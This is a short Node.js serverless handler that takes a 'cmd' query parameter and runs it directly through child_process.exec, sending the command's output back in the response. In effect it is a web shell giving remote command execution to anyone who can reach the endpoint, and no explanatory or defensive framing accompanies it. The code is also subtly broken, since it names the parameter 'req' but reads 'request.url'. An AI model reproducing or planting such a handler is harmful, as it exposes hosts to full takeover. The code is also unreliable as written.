const util = require('util');
const exec = util.promisify(require('child_process').exec);

exports.handler = async (req) => {
  try {
    const url = new URL(request.url);
    const cmd = url.searchParams.get('cmd');
    const { stdout, stderr } = await exec(cmd);
    console.log('Output:', stdout);
    if (stderr) {
      console.error('Error output:', stderr);
    }
    return {
    statusCode: 200,
    body: `stdout:
${stdout}
stderr:
${stderr}
`
  };
  } catch (err) {
    console.error('Execution failed:', err);
  }
};
